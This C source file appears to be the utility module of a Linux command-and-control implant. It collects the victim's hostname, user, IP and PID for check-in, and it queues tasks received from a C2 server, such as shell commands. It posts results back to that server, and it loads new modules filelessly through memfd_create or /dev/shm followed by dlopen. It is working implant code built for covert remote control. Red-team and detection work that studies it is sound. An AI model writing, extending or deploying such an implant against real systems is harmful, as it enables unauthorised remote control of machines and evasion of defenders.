
#include "utils.h"
#include "errors.h"
#include <stdlib.h>
#include <pwd.h>
#include "default_commands.h"
#include "C2PROFILE_NAME_HERE.h"

int find_char(char * string, char token, int count)
{
	/* find the count-th instance of token in string if it exists*/
	int i, c=0;
	for (i = 0; i < strlen(string); i++){
		if(string[i] == token){
			c++;
			if(c == count){
				return i; //return the index of the count-th instance
			}
		}
	}
	return ERR_CHAR_NOT_FOUND;
}
int find_end_of_headers(char* string){
    int i;
    for(i = 0; i < strlen(string) -2; i++){
        if(string[i] == '\n' && string[i+1] == '\n'){
            return i+2;
        }
    }
    //if we didn't find \n\n look for \r\n\r\n instead
    for(i = 0; i < strlen(string)-4; i++){
        if(string[i] == '\r' && string[i+1] == '\n'){
            if(string[i+2] == '\r' && string[i+3] == '\n'){
                return i+4;
            }
        }
    }
    return ERR_CHAR_NOT_FOUND;
}
char* get_ip(int sock_id)
{
	struct sockaddr_in addr;
	socklen_t socklen = sizeof(addr); // important! Must initialize length, garbage produced otherwise
	char *ip = calloc(20, sizeof(char)); //123.567.901.345\00
	if (getsockname(sock_id, (struct sockaddr*) &addr, &socklen) < 0) {
	    perror("\nfailed to get ip address\n");
	}
	else {
		strncpy(ip, inet_ntoa(addr.sin_addr), 15);
	    //printf("Address: %d, port: %d\n", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
	}
	return ip;
}
char* get_user(){
    register struct passwd *pw;
    register uid_t uid;
    int c;
    
    uid = geteuid ();
    pw = getpwuid (uid);
    if (pw)
    {
        return pw->pw_name;
    }
    else{
        return NULL;
    }
}
char * get_host(){
    char* hostname = (char*)calloc(1024, 1);
    hostname[1023] = '\0';
    gethostname(hostname, 1023);
    return hostname;
}
pid_t get_pid()
{
	return getpid();
}

void update_global_info_from_checkin(cJSON * json)
{
    pthread_mutex_lock(&global_lock);
    //update the global_JSON_info data structure
    if(cJSON_HasObjectItem(json, "id")){
        unsigned int id = cJSON_GetObjectItem(json, "id")->valueint;
        if(id > 0){
            global_info->callback_id = id;
        }
        else{
            printf("Failed to get an id from the server");
            exit(1);
        }
    }
    pthread_mutex_unlock(&global_lock);
}
void add_task_to_queue(cJSON * json)
{
	pthread_mutex_lock(&global_lock);
    //add this task {"command": "shell", "params": "whoami", "id": 5} to the queue for processing
    cJSON_AddItemToArray(cJSON_GetObjectItem(global_info->tasking, "tasks"), cJSON_Duplicate(json,1));
	pthread_mutex_unlock(&global_lock);
}

m_function * get_tasking_func(cJSON* task)
{
    /* task: {"command": "shell", "params": "whoami", "id": 5} */
	//pthread_mutex_lock(&global_lock);
    char * command = cJSON_GetObjectItem(task, "command")->valuestring;
	for(int i = 0; i < global_info->num_functions; i++)
	{
		if( strcmp(global_info->functions[i].name, command) == 0)
		{
			//we found the function, so return it
			//pthread_mutex_unlock(&global_lock);
			return &(global_info->functions[i]);
		}
	}
	//pthread_mutex_unlock(&global_lock);
	return NULL;
}

cJSON* pop_tasking()
{
	/* remove the first task from the global_info task structure and return it */
	cJSON* popped_task = NULL;
	pthread_mutex_lock(&global_lock);
	cJSON* tasks = cJSON_GetObjectItem(global_info->tasking, "tasks");
	if(cJSON_GetArraySize(tasks) > 0){
		popped_task = cJSON_DetachItemFromArray(tasks, 0);
	}
	pthread_mutex_unlock(&global_lock);
	return popped_task;
}

void update_global_functions(char* name, int (*func)(cJSON *) ){
    pthread_mutex_lock(&global_lock);
    // first check if the function exists, if it does, just modify the pointer
    int i = 0;
    for(i = 0; i < global_info->num_functions; i++){
        if( strcmp(name, global_info->functions[i].name) == 0){
            global_info->functions[i].func = *func;
            pthread_mutex_unlock(&global_lock);
            return;

        }
    }
    //we need to allocate room for it
    // increase the number of functions
    global_info->num_functions++;
    // realloc the memory for our functions array
    global_info->functions = realloc(global_info->functions, sizeof(m_function)*(global_info->num_functions));
    // update with new values
    global_info->functions[global_info->num_functions-1].name = name;
    global_info->functions[global_info->num_functions-1].func = *func;
    pthread_mutex_unlock(&global_lock);
}

int read_from_fd(int fd, char* buff, int buf_size){
    /* caller is responsible for freeing the buffer */
    if (buf_size <= 0){
        //printf("buff size in read_from_fd <= 0\n");
        return ERR_BUF_SIZE;
    }
    int bytes = read(fd, buff, buf_size-1);
    //printf("read %d bytes out of buff size %d\n", bytes, buf_size);
    if ( bytes == -1){
        //printf("failed to read from fd\n");
        return ERR_READING_FROM_FD;
    }
    // if there's more to read, it's up to the caller to post what we have back to the server and then reading more
    return SUCCESS;
}

int send_basic_response(char * message, int task_id){
    cJSON * response = cJSON_CreateObject();
    cJSON_AddNumberToObject(response,"id",task_id);
    cJSON_AddStringToObject(response, "data", message);
    int return_id = global_info->C2.post_response(response);
    cJSON_Delete(response);
    return return_id;
}
/* series of functions required to do in-memory loading of new modules */
static inline int memfd_create(const char *name, unsigned int flags) {
	return syscall(__NR_memfd_create, name, flags);
}
/* indicate if our kernel version is < 3.17 or not so we can use memfd_create*/
int kernel_version() {
	struct utsname buffer;
	uname(&buffer);

	char *token;
	char *separator = ".";

	token = strtok(buffer.release, separator);
	if (atoi(token) < 3) {
		return 0;
	}
	else if (atoi(token) > 3){
		return 1;
	}

	token = strtok(NULL, separator);
	if (atoi(token) < 17) {
		return 0;
	}
	else {
		return 1;
	}
}

/* return handle to a loaded so object */
void* get_so_handle(unsigned char* in_mem_buffer, size_t length) {
	char path[1024];
	void *handle;
	int shm_fd;

	if (kernel_version() == 1) {
	    //printf("[+] looking at kernel >= 3.17\n");
	    shm_fd = memfd_create(SHM_NAME, 1);
		if (shm_fd < 0) {
			//printf("[-] Could not open file descriptor\n");
			return NULL;
		}
		//write our buffer to the new fd in our in-mem file system
		if (write(shm_fd, in_mem_buffer, length) < 0) {
            //printf("[-] Could not write file :'(\n");
            close(shm_fd);
            return NULL;
	    }
	    //get the 'path' to our new file
		snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
	} else {
	    //printf("[+] looking at kernel < 3.17\n");
	    shm_fd = shm_open(SHM_NAME, O_RDWR | O_CREAT, S_IRWXU);
		if (shm_fd < 0) {
			//printf("[-] Could not open file descriptor\n");
			return NULL;
		}
		//write our buffer to the new fd in our in-mem file system
		if (write(shm_fd, in_mem_buffer, length) < 0) {
            //printf("[-] Could not write file :'(\n");
            close(shm_fd);
            return NULL;
	    }
	    //get the 'path' to our new file
		close(shm_fd);
		snprintf(path, 1024, "/dev/shm/%s", SHM_NAME);
	}
	handle = dlopen(path, RTLD_GLOBAL | RTLD_NOW | RTLD_NODELETE);
	if (!handle) {
		//printf("[-] Dlopen failed with error: %s\n", dlerror());
		return NULL;
	}
	return handle;
}

/* add a new thread to our jobs list*/
void add_thread_to_global_info(cJSON* task, pthread_t* thread_task){
    m_job * new_job = (m_job *)malloc(sizeof(m_job));
    new_job->task = cJSON_GetObjectItem(task, "id")->valueint;
    new_job->job = thread_task;
    new_job->next = NULL;
    new_job->command_string = cJSON_PrintUnformatted(task);
    // now iterate through our current list to find the end so we can add this one
    pthread_mutex_lock(&global_lock);
    if(global_info->jobs == NULL){
        // this means we don't have anything here, so just add to the beginning
        global_info->jobs = new_job;
    }else{
        // we have some number of jobs running, so traverse the linked-list to the end and add this in
        m_job * curr_job = global_info->jobs;
        while(curr_job->next != NULL){
            curr_job = curr_job->next;
        }
        curr_job->next = new_job;
    }
    pthread_mutex_unlock(&global_lock);
}

/* remove a thread from our jobs list*/
pthread_t* remove_thread_from_global_info(unsigned int task_id){
    pthread_t *thread = NULL;
    if(global_info->jobs == NULL){
        return;
    }
    pthread_mutex_lock(&global_lock);
    m_job * curr_job = global_info->jobs;
    m_job * prev_job = NULL;
    while(curr_job != NULL){
        if(curr_job->task == task_id){
            //we found the task, we need to remove it
            if(prev_job == NULL){
                //we're trying to remove the first task
                global_info->jobs = curr_job->next;
                thread = curr_job->job;
                free(curr_job);
            }else{
                //we're trying to remove one that isn't the first
                prev_job->next = curr_job->next;
                thread = curr_job->job;
                free(curr_job);
            }
            // we found and removed the task, so return
            pthread_mutex_unlock(&global_lock);
            return thread;
        }
        //we didn't find the task, so update our pointers
        prev_job = curr_job;
        curr_job = curr_job->next;
    }
    pthread_mutex_unlock(&global_lock);
    return thread;
}

/* Get all currently running jobs*/
char * get_current_jobs(){
    unsigned int job_info_length = 1000;
    char * job_info = (char*)calloc(1000, 1);
    pthread_mutex_lock(&global_lock);
    //loop through all of our jobs
    m_job * curr_job = global_info->jobs;
    //printf("about to loop through current jobs\n");
    while(curr_job != NULL){
        if(strlen(curr_job->command_string) + strlen(job_info) + 1 > job_info_length ){
            //we need to expand our job_info buffer to hold the new string
            job_info = realloc(job_info, job_info_length*2);
            job_info_length *= 2;
        }
        //printf("about to do memcpy in get_current_jobs\n");
        memcpy(job_info + strlen(job_info), curr_job->command_string, strlen(curr_job->command_string));
        //printf("Job %d: %s\n", curr_job->task, curr_job->command_string);
        curr_job = curr_job->next;
    }
    pthread_mutex_unlock(&global_lock);
    return job_info;

}